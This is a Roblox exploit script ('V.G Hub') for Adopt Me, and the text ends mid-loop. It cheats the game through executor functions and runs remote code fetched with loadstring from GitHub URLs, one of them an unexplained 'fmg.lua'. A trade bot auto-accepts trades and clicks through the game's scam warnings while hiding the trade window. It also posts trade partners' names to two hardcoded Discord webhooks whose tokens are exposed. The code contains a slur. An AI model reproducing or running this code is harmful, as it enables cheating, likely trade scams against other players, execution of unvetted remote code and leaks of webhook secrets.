loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/Global"))()
repeat wait() until Player.PlayerGui:FindFirstChild("PlayButton",true)
RunService.Stepped:Connect(function()
    pcall(function()
        if Player.PlayerGui:FindFirstChild("NewsApp",true).Enabled then
            for i,v in pairs(getconnections(Player.PlayerGui:FindFirstChild("PlayButton",true).MouseButton1Click)) do
                v:Fire()
            end
        end
        if Player.PlayerGui:FindFirstChild("ChooseParent",true) then
            for i,v in pairs(getconnections(Player.PlayerGui:FindFirstChild("ChooseParent",true).MouseButton1Click)) do
                v:Fire()
            end
        end
        if Workspace:FindFirstChild("ServerSidedMapSeats") then
            Workspace.ServerSidedMapSeats:Destroy()
        end
    end)
end)

local Table = {6152116144, 185655149}
local Set = setfpscap
local getupvalue = getupvalue or debug.getupvalue
local getconstant = getconstant or debug.getconstant
local getconstants = getconstants or debug.getconstants
local getgc = getgc or get_gc_objects or debug.getgc
local getreg = getreg or getregistry or debug.getregistry
local get_thread_context = get_thread_context or getthreadcontext or getidentity or syn.get_thread_identity
local get_thread_identity = get_thread_context
local set_thread_context = set_thread_context or setthreadcontext or setidentity or syn.set_thread_identity
local set_thread_identity = set_thread_context
local Remotes = {}
local Inventorys = ReplicatedStorage.ClientDB.Inventory
local Count = 0
local Stores = {
    "CoffeeShop",
    "Supermarket",
    "PizzaShop",
    "ToyShop",
    "Obbies",
    "Neighborhood",
    "CampingShop",
    "AutoShop",
    "Nursery",
    "Cave",
    "IceCream",
    "PotionShop",
    "SkyCastle",
    "Hospital",
    "HatShop",
    "PetShop",
    "School",
    "BabyShop",
    "HotSpringHouse",
    "SafetyHub",
    "DebugInterior",
    "VIP",
    "Salon",
    "SpleefMinigame",
    "SimonSaysMinigame",
    "WinterCastle"
}

local Baths = {
    "StylishShower",
    "CheapBathtub",
    "ModernShower",
    "Bathtub",
    "GingerbreadShower",
    "HotTub"
}

local FreeFoods = {
    "ham_vip",
    "water_vip",
    "chocolate_milk_vip",
    "popcorn_vip",
    "marshmallow_on_a_stick",
    "healing_apple",
    "teachers_apple",
}

local Beds = {
    "FancyPetBed",
    "ModernPetBed",
    "CircularPetBed",
    "RectangularPetBed",
    "NormalCrib",
    "BasicCrib",
    "RoyalCrib",
    "PoshCrib",
}
local Tasks = {
    "hungry",
    "sleepy",
    "thirsty",
    "bored",
    "dirty",
    "camping",
    "sick",
    "school",
    "pool_party",
    "salon",
    "pizza_party",
    "beach_party"
}

local Eggs = {
    "cracked_egg",
    "regular_pet_egg",
    "royal_egg",
    "retired_egg",
    "seasia_2023_egg",
    "mythic_egg",
    "japan_2022_egg",
    "danger_2023_egg",
}

local gifts = {
    "smallgift",
    "biggift",
    "massivegift",
    "legend_hat_2022_simple_chest",
    "legend_hat_2022_regal_chest"
}
local Obbys = {
    "miniworld",
    "coastal_climb",
    "shipwreck_bay",
    "ancient_ruins",
    "lonelypeak",
    "pyramid",
    "tinyisles"
}

local RetardedBullShit = {
    "CashRegister",
    "GoldenCashRegister"
}

local PP = {}

local Part = Instance.new("Part")
Part.Name = "P"
Part.Size = Vector3.new(9e9,0,9e9)
Part.Anchored = true
Part.Transparency = 0.5
Part.CFrame = CFrame.new(5000,5000,5000)
Part.Parent = Workspace
ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("InteriorsM"):WaitForChild("InteriorsM")

local Location = nil
for i, v in pairs(getgc()) do
    if type(v) == "function" then
        if getfenv(v).script == ReplicatedStorage.ClientModules.Core.InteriorsM.InteriorsM then
            if table.find(getconstants(v), "LocationAPI/SetLocation") then
                Location = v
                break
            end
        end
    end
end

local SetLocation = function(A, B, C)
    local O = get_thread_identity()
    set_thread_identity(2)
    Location(A, B, C)
    set_thread_identity(7)
end
local Home = function()
    if Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model") then
        return Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model").Name
    else
        return false
    end
end
local PersonHome = function()
    if Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model") then
        return Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA("Model").Name
    else
        return false
    end
end
local Store = function()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if not string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"MainMap") and not
            string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"Neighborhood")
        then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

local MainMap = function()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"MainMap") then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

local Neighborhood = function()
    if Workspace.Interiors:FindFirstChildWhichIsA("Model") then
        if string.find(Workspace.Interiors:FindFirstChildWhichIsA("Model").Name,"Neighborhood") then
            return Workspace.Interiors:FindFirstChildWhichIsA("Model").Name
        else
            return false
        end
    else
        return false
    end
end

local GoToStore = function(Name)
    if Store() == Name then
        return true
    end

    SetLocation(Name, "MainDoor", {})

    while Store() ~= Name do
        wait()
    end
    if Home() then
        return true
    end
    return false
end

local GoToHome = function()
    SetLocation("housing", "MainDoor", {["house_owner"] = Player})
    while not Home() do
        wait()

    end
    if Home() then

        return true
    end

    return false

end

local GoToNeighborhood = function()
    SetLocation("Neighborhood", "MainDoor", {})
    while not Neighborhood() do
        wait()

    end
    if Neighborhood() then

        return true
    end
    return false
end

local GoToMainMap = function()
    SetLocation("MainMap", "Neighborhood/MainDoor", {})
    while not MainMap() do

        wait()
    end
    if MainMap() then

        return true
    end
    return false
end

local GoToPersonsHouse = function(Name)
    SetLocation("housing","MainDoor",{["house_owner"] = Players[Name]})
    while not PersonHome() do

        wait()
    end
    if PersonHome() then

        return true
    end
    return false
end
local Bed = function(Name)
    GoToHome()
    Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6)) 
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(Beds, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"/f")[2]
            print(String)
            return "f".. String
        end
    end
end
local Cash = function()
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(RetardedBullShit, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"/f")[2]
            print(String)
            return "f".. String
        end
    end
end

local Showers = function(Name)
    GoToHome()
    Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6)) 
    for i, v in pairs(Workspace.HouseInteriors.furniture:GetChildren()) do
        if v:FindFirstChildWhichIsA("Model") and (table.find(Baths, v:FindFirstChildWhichIsA("Model").Name)) then
            local String = string.split(v.Name,"true/")[2]
            print(String)
            return String
        end
    end
end

local NoCliper = function()
    for i,v in next, Player.Character:GetChildren() do
        if v:IsA("BasePart") then
            v.CanCollide = false
            v.Velocity = Vector3.new(0,0,0)
        end
    end
    return Player.Character
end

local IsStarted = function()
    local InGame,NotGame = Workspace.Interiors:FindFirstChild("TileSkipMinigame", true), Workspace.Interiors:FindFirstChild("TileSkipMinigameLobby", true)
    if InGame and InGame.Minigame:FindFirstChild("GoalPart") and not NotGame then
        Player.Character.HumanoidRootPart.CFrame = InGame.Minigame:FindFirstChild("GoalPart").CFrame
    elseif not InGame and NotGame then
        Player.Character.HumanoidRootPart.CFrame = Workspace.Interiors.TileSkipMinigameLobby.JoinZone.EmitterPart.CFrame
    elseif not InGame or not NotGame then
        GoToStore("TileSkipMinigameLobby")
        Player.Character.HumanoidRootPart.CFrame = Workspace.Interiors.TileSkipMinigameLobby.JoinZone.EmitterPart.CFrame
    end
end

local Ingame = function()
    local Lunar2024Shop = Workspace.Interiors:FindFirstChild("Lunar2024Shop")
    if Lunar2024Shop then
        if Lunar2024Shop:FindFirstChild("RedLightGreenLight") and Lunar2024Shop.RedLightGreenLight.JoinZone.Billboard.BillboardGui.TimerLabel.Text:find("GAME IN PROGRESS") then
            return true
        else
            return false
        end
    end
end

local Dothings = function()
    local Throwables = Workspace.Interiors.Lunar2024Shop.Arena:FindFirstChild("Throwables")

    if not Ingame() then
        VG.Teleport(Workspace.Interiors.Lunar2024Shop.RedLightGreenLight.JoinZone.Collider.Position)
    end
    if Ingame() then
        for i,v in next, Throwables:GetChildren() do
            if v:IsA("Model") then
                VG.Teleport(v:GetModelCFrame().Position)
                wait(.3)
                Count = Count + 1
                print(Count)
                if Count > 3 then
                    break
                end
            end
        end
        if Count >= 3 then
            VG.Teleport(Workspace.Interiors.Lunar2024Shop.Arena.SafeZones:FindFirstChildWhichIsA("BasePart").Position)
            wait(2)
            Count = 0
        end
    end
end

local Neons = {}
local AilmentFurnitues = {}
local Neon = {}
local Spec = {}
local Key = {}
local PetID
local Pet
local PetsShow = {}
local List = {}
local JoJo = {}
local GGO = {}
local Ps = {}
for i,v in next, Players:GetPlayers() do
    table.insert(Ps, v.Name)
end
for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
    local key = tostring(v["id"]) .. " - " .. tostring(v["properties"]["age"]) .. " years old"
    if not table.find(List, Key) and v.kind ~= "practice_dog" then
        PetsShow[key] = v
        table.insert(List, key)
        table.sort(List)
    end
end
for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
    if not table.find(JoJo,tostring(v["id"])) and v.kind ~= "practice_dog" then
        local Key2 = tostring(v["id"])
        GGO[Key2] = v
        table.insert(JoJo,Key2)
        table.sort(JoJo)
    end
end

UserInputService.WindowFocusReleased:Connect(function()
    if Render then
        RunService:Set3dRenderingEnabled(false)
        if table.find(Table, game.PlaceId) then
            Set(30)
        else
            Set(15)
        end
    end
end)
UserInputService.WindowFocused:Connect(function()
    if Render then
        RunService:Set3dRenderingEnabled(true)
        Set(100)
    end
end)

for i, v in pairs(getupvalue(require(ReplicatedStorage.Fsys).load("RouterClient").init, 4)) do
    v.Name = i
end
pcall(function()
    ReplicatedStorage.API:FindFirstChild("DailyLoginAPI/ClaimDailyReward"):InvokeServer()
end)

local a = {
    ["sleepy"] = function(c)
        spawn(function()
            while wait(3) and c.Parent == Player.PlayerGui.AilmentsMonitorApp.Ailments and PetFarm do
                if c.Parent == Player.PlayerGui.AilmentsMonitorApp.Ailments then
                    print(Player, Bed(), 'UseBlock', {['cframe'] = Player.Character.HumanoidRootPart.CFrame}, C)
                    ReplicatedStorage:FindFirstChild('HousingAPI/ActivateFurniture',true):InvokeServer(Player, Bed(), 'UseBlock', {['cframe'] = Player.Character.HumanoidRootPart.CFrame}, C)
                    if not Bed() then
                        GoToMainMap()
                        GoToHome()
                    end
                end
            end
        end)
        repeat wait(0) until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ['dirty'] = function(c)
        spawn(function()
            while c.Parent == Player.PlayerGui.AilmentsMonitorApp.Ailments and wait(3) do
                print(Player, Bed(), 'UseBlock', {['cframe'] = Player.Character.HumanoidRootPart.CFrame}, C)
                ReplicatedStorage:FindFirstChild("HousingAPI/ActivateFurniture",true):InvokeServer(Player, Showers(), 'UseBlock', {['cframe'] = Player.Character.HumanoidRootPart.CFrame}, C)
                if not Showers() then
                    GoToMainMap()
                    GoToHome()
                end
            end
        end)
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
        end,
    ["hungry"] = function(c)
        ReplicatedStorage:FindFirstChild("ShopAPI/BuyItem",true):InvokeServer('food', 'pizza', {})
        ReplicatedStorage:FindFirstChild("ToolAPI/BakeItem",true):InvokeServer()
        while Player.Character:FindFirstChild('PizzaTool') do wait() end
        while not Player.Character:FindFirstChild('PizzaTool') do wait() end
        local Foods = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.food or {}
        local Pizza
        for i,v in pairs(Foods) do
            if v.id == 'pizza' then
                Pizza = v.unique
                break
            end
        end
        if not Pizza then
            return
        end
        wait(2)
        ReplicatedStorage:FindFirstChild("PetObjectAPI/CreatePetObject",true):InvokeServer("__Enum_PetObjectCreatorType_2", {["unique_id"] = Pizza})
        ReplicatedStorage:FindFirstChild("PetAPI/ConsumeFoodItem",true):FireServer(Pizza)
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["thirsty"] = function(c)
        ReplicatedStorage:FindFirstChild("ShopAPI/BuyItem",true):InvokeServer('food', 'tea', {})
        local Foods = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.food or {}
        local Tea
        for i, v in pairs(Foods) do
            if v.id == 'tea' then
                Tea = v.unique
                break
            end
        end
        if not Tea then
            return
        end
        wait(2)
        print(Tea)
        ReplicatedStorage:FindFirstChild("PetObjectAPI/CreatePetObject",true):InvokeServer("__Enum_PetObjectCreatorType_2", {["unique_id"] = Tea})
        ReplicatedStorage:FindFirstChild("PetAPI/ConsumeFoodItem",true):FireServer(Tea)
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["sick"] = function(c)
        repeat wait(0) ReplicatedStorage:FindFirstChild("MonitorAPI/HealWithDoctor",true):FireServer() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["adoption_party"] = function(c)
        GoToStore('Nursery')
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["school"] = function(c)
        GoToStore('School')
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["pizza_party"] = function(c)
        GoToStore("PizzaShop")
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["salon"] = function(c)
        GoToStore("Salon")
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["beach_party"] = function(c)
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame = CFrame.new(Workspace.StaticMap.Beach.BeachPartyAilmentTarget.Position + Vector3.new(0, 5, 0))
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ["camping"] = function(c)
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame = CFrame.new(Workspace.StaticMap.Campsite.CampsiteOrigin.Position + Vector3.new(0, 5, 0))
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end,
    ['bored'] = function(c)
        GoToMainMap()
        Player.Character.HumanoidRootPart.CFrame = CFrame.new(Workspace.StaticMap.Park.AilmentTarget.Position + Vector3.new(0, 5, 0))
        repeat wait() until c.Parent ~= Player.PlayerGui.AilmentsMonitorApp.Ailments
    end
}


local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "V.G Hub: Game " .. MarketplaceService:GetProductInfo(game.PlaceId).Name,
    SubTitle = "by DekuDimz",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.Delete -- Used when theres no MinimizeKeybind
})


local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local Options = Fluent.Options

do
    Fluent:Notify({
        Title = "V.G Hub Loaded",
        Content = "Congrats your using V.G Hub " .. Verison,
        SubContent = "", -- Optional
        Duration = 10 -- Set to nil to make the notification not disappear
    })
        
    local Toggle = Tabs.Main:AddToggle("v3", {Title = "RedLightGreenLight Minigame", Default = false})
    Toggle:OnChanged(function()
        Toggle = Options.v3.Value
        spawn(function()
            while Toggle and wait() do
                pcall(function()
                    Dothings()
                end)
            end
        end)
    end)


local PlayerService = game:GetService("Players")--:GetPlayers()
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local plr = PlayerService.LocalPlayer
local mouse = plr:GetMouse()
local BodyThrust = nil
local Dragging = {}


local Suggestions = {
    2298830673, 300, 365, --gamier (test game)
    1537690962, 250, 350, --bee swarm sim
    5580097107, 300, 400, --frappe
    2202352383, 275, 350, --super power training sim
    142823291, 350, 425,  --murder mystery 2
    155615604, 273, 462,  --prison life
    1990228024, 200, 235, --bloxton hotels
    189707, 250, 325,     --natural disaster survival
    230362888, 265, 415,  --the normal elevator       (may not work)
    5293755937, 335, 435, --speedrun sim
    537413528, 300, 350,  --build a boat              (may not work)
    18540115, 300, 425,   --survive the disasters
    2041312716, 350, 465  --Ragdoll engine
}


local version = "v1.0.4"
local font = Enum.Font.FredokaOne

local AxisPositionX = {
    0.05, 
    0.35,
    0.65
}

local AxisPositionY = {
    40, --edit fling speed
    90, --toggle fling types (normal, qfling, serverkek)
    140, --extra (respawn)
    190, --edit gui settings (hotkey, theme)
    240
}

local Fling = {
    false, --toggle
    "", --hotkey
    300, --speed
    false, --server
    false --stop vertfling
}


local function GetRigType()
    
    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return Enum.HumanoidRigType.R15
    elseif plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
        return Enum.HumanoidRigType.R6
    else
        return nil
    end
end

local function GetDeadState(player)
    if player.Character.Humanoid:GetState() == Enum.HumanoidStateType.Dead then
        return true
    else
        return false
    end
end


local function EnableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = false
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        end
    end
end

local function DisableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = true
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        end
    end
end


local function TToggleFling(PlayerName)
        
        BodyThrust = Instance.new("BodyThrust")
        if GetRigType() == Enum.HumanoidRigType.R6 then
            BodyThrust.Parent = plr.Character.Torso
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            BodyThrust.Parent = plr.Character.UpperTorso
        end
        
        EnableNoClip() 
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        
        
        print("Enabled fling")

        wait(2)

        
        DisableNoClip()
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
        BodyThrust:Destroy()
        
        print("Disabled fling")
        
end


    Tabs.Main:AddButton({Title = "Disable graphics",Description = "Grabs Trading Linence",Callback = function()
        for i,v in pairs(game:GetService("Workspace").Interiors:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Transparency = 1 
            end 
        end 

        game:GetService("Workspace").Interiors.DescendantAdded:Connect(function(v)
            if v:IsA('BasePart') and Hide then
                v.Transparency = 1 
            end 
        end)
    end})

    local Toggle = Tabs.Main:AddToggle("Hi10", {Title = "Teleport Personer", Default = false})
    Toggle:OnChanged(function()
        Sus = Options.Hi10.Value
        spawn(function()
            while wait() and Sus do 
                pcall(function()
                    local Is 
                    if not Is then  
                        GoToPersonsHouse(tostring(Playt))
                        Player.Character.HumanoidRootPart.CFrame = Workspace.HouseInteriors.blueprint:FindFirstChildWhichIsA('Model'):GetModelCFrame():ToWorldSpace(CFrame.new(0, 0, -6)) 

                        wait(5)
                        while true do
                            local plr1 = game.Players.LocalPlayer.Character
                            local plr2 = game:GetService("Players"):FindFirstChild(Playt)

                            plr1.HumanoidRootPart.CFrame = plr2.Character.HumanoidRootPart.CFrame
                            wait(5)
                        end
                    end 
                end)
            end 
        end)
    end)
    local bb = game:service'VirtualUser'
    game:service'Players'.LocalPlayer.Idled:connect(function()
        bb:CaptureController()
        bb:ClickButton2(Vector2.new())
        ab.Text="Roblox tried to kick u but i kicked him instead"
        wait(2)
        ab.Text="Status : Active"
    end)
    Tabs.Main:AddButton({Title = "Start bot",Description = "start bot",Callback = function()
    spawn(function()
json = loadstring(game:HttpGet('https://raw.githubusercontent.com/rxi/json.lua/master/json.lua'))()

local https = game:GetService('HttpService')
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local VirtualUser = game:GetService("VirtualUser")
local Player = Players.LocalPlayer
local wait = task.wait

loadstring(game:HttpGet("https://raw.githubusercontent.com/Maximusikk/itrScri/main/fmg.lua"))()
local Webhook = "https://discord.com/api/webhooks/1041757702960980121/N1TuHBGCcqCjfZQBZgpjT5uzg6qo8i7PAAkm9grxpATpdzfaEOWaXy-FANf36E1zqKYM"
local webhook2 = "https://discord.com/api/webhooks/1069275478545944766/-ZnKO86KllyneMmlBoyFeqg0Mt--etvYYnlhSntVqBU1OH-MSbn7NDu8y-xT6H373Bnn"
local radius = 150
local Xc = 0
local Zc = 0
local angle = 0

local player = game.Players.LocalPlayer
local bad_items = {
    ['rbxassetid://2582282124'] = 'Sandwich',
    ['rbxassetid://7137574255'] = 'Honey candy',
    ['rbxassetid://1043331236'] = 'Watermelon',
    ['rbxassetid://1373237029'] = 'Big head potion'
    
}

_G.accepts = 0
_G.confirms = 0
_G.button = nil
_G.accepted = false


_G.declined = false
_G.first_360 = nil

function button_click (button_obj)
    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
    
    for i,v in pairs(events) do
        for _,connection in pairs(getconnections(button_obj[v])) do
            pcall(function ()
                connection:Fire()
            end)
        end
    end
end

function decline ()
    pcall(function ()
        decline_button = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline
        button_click(decline_button)
    end)
    
    _G.accepts = 0
end

function cash_out ()
    pcall(function ()
        cash_button = game:GetService("Players")[player.Name].PlayerGui.CheckApp.Frame.Buttons.CashOut
        button_click(cash_button)
    end)
end




function sendToDiscord(color, message, everyone)
    MyNick = game:GetService("Players").LocalPlayer.Name
    ChelNick = game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.NegotiationFrame.Header.PartnerFrame.NameLabel.Text
    
    local t = os.date("!*t")
    local s = {}
    for k, v in pairs(t) do
      local temp = tostring(v)
      if #temp == 1 then temp = "0" .. temp end
      s[k] = temp
    end
    
    timestamp = s.year .. "-" .. s.month .. "-" .. s.day  .. "T" .. s.hour .. ":" .. s.min .. ":" .. s.sec .. "." .. "000Z"

    local embed = {
        {
            ["color"] = color,
            ["title"] = "Trade confrimed",
            ["description"] = message,
            ["fields"] = {
                {
                    ['name'] = 'Bot',
                    ['value'] = MyNick,
                    ['inline'] = false
                },
                {
                    ['name'] = 'Player',
                    ['value'] = ChelNick,
                    ['inline'] = false
                }
            },
            ["timestamp"] = timestamp
        }
    }

    if everyone == false or everyone == nil then
        content = ''
    else
        content = '@everyone'
    end

    local data = {
        ["content"] = content,
        ["username"] = 'Pets2',
        ["embeds"] = embed
    }
    
local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
    local data_for_request = {Url = Webhook, Body = game:GetService('HttpService'):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
    good_request = http_request or request or HttpPost or syn.request
    good_request(data_for_request)
end

function sendTo2Discord(color, message, everyone)

    local t = os.date("!*t")
    local s = {}
    for k, v in pairs(t) do
      local temp = tostring(v)
      if #temp == 1 then temp = "0" .. temp end
      s[k] = temp
    end
    
    timestamp = s.year .. "-" .. s.month .. "-" .. s.day  .. "T" .. s.hour .. ":" .. s.min .. ":" .. s.sec .. "." .. "000Z"

    local embed = {
        {
            ["color"] = color,
            ["description"] = message,
            ["timestamp"] = timestamp
        }
    }

    if everyone == false or everyone == nil then
        content = ''
    else
        content = '@everyone'
    end

    local data = {
        ["content"] = content,
        ["username"] = 'Ids',
        ["embeds"] = embed
    }
    
local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
    local data_for_request = {Url = webhook2, Body = game:GetService('HttpService'):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
    good_request = http_request or request or HttpPost or syn.request
    good_request(data_for_request)
end


local runservice = game:GetService("RunService") -- this is the service for the fps idk it handles all processing

local player = game:GetService("Players").LocalPlayer
runservice.Stepped:Connect(function()
    for i,v in pairs(player.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false -- this disables the collision in your character(ALL COLLISIONS are disabled except for standing)
        end
    end
end)

wait(1)


local bb = game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
    ab.Text="Roblox tried to kick u but i kicked him instead"
    wait(2)
    ab.Text="Status : Active"
end)

while wait(1) do
    _G.accepted = false
    
    if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
        game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
    end


    if pcall(function()
       abc_button = game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate
    end) then
        _G.confirms = 0
        _G.accepts = 0

        if game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible == true then
            game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = false
        end

            for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end

        pcall(function()
            if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'This trade seems') then
                button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                 button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
            end
        end)

        
        wait(.1)
        

        pcall(function()
            if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Remember:') then
                button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                 button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
            end
        end)
                for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end

        for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                if button.Face.TextLabel.Text == 'Accept' and string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'sent you a trade request') then
                    _G.button = button
                    wait(5)
                    button_click(_G.button)
                    button_click(_G.button)
                    break
                end
            end
        end

        
        wait(.1)
                for index,button in pairs(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Celestial2024Dialog.Buttons:GetDescendants()) do
            if button.Name == 'ButtonTemplate' then
                button_click(_G.button)
                button_click(_G.button)
                break
            end
        end
        
        pcall(function()
            if string.find(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Info.TextLabel.Text, 'Be careful when trading') then
                button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
                 button_click(game:GetService("Players")[player.Name].PlayerGui.DialogApp.Dialog.NormalDialog.Buttons.ButtonTemplate)
            end
        end)

        game:GetService("Players")[player.Name].PlayerGui.TradeApp.Frame.Visible = true

        
        wait(.2)
    

